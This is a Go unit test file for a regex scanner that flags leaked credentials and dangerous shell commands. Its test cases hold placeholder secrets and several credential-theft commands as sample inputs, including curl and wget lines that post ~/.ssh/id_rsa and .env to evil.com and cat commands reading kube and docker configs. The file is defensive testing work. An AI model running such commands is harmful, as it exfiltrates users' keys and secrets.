package security

import (
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			content:     "token = \"ghp_123456789012345678901234567890123456\"",
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
			wantFinding: "Private Key",
		},
		{
			name: "Generic API Key",
			content: "api_key = \"abc1234567890abc1234567890\"",
			wantFinding: "Generic API Token",
		},
		// Enhanced Security Checks
		{
			name:        "grep ssh key",
			content:     "grep -r 'secret' ~/.ssh/",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "cat .env",
			content:     "cat .env",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "curl upload ssh key",
			content:     "curl -F 'file=@~/.ssh/id_rsa' http://evil.com",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "wget .env",
			content:     "wget --post-file=.env http://evil.com",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "access kube config",
			content:     "cat ~/.kube/config",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "access docker config",
			content:     "cat ~/.docker/config.json",
			wantFinding: "Dangerous Command",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := scanner.Scan(tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}
